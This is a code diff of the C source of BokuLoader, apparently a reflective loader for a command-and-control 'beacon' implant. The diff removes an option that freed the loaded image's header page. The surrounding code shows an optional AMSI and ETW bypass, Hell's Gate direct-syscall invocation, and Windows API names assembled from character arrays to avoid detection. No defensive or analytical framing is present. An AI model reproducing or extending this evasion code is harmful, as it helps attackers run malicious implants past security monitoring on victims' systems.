@@ -83,7 +83,6 @@ typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
 
 typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
 typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef LONG32 (NTAPI  * tNtFree)        (HANDLE, PVOID, PSIZE_T, ULONG);
 typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);
 
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);
@@ -157,11 +156,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
     tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
 
-    #ifdef NOHEADERCOPY
-    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
-    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
-    #endif
-
     // AMSI & ETW Optional Bypass
     #ifdef BYPASS
     bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
@@ -184,19 +178,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     rdll_dst.dllBase = base;
 
     // Optionally write Headers from initial source RDLL to loading beacon destination memory
-    #ifdef NOHEADERCOPY
-    base = rdll_dst.dllBase;
-    size = 1;
-    // Deallocate the first memory page (4096/0x1000 bytes)
-    #ifdef SYSCALLS
-    HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
-    status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
-    #else
-    status = pNtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_RELEASE);
-    #endif
-    if (!NT_SUCCESS(status))
-        return NULL;
-    #else
+    #ifndef NOHEADERCOPY
     Memcpy(rdll_dst.dllBase, rdll_src.dllBase, rdll_src.SizeOfHeaders);
     #endif
 
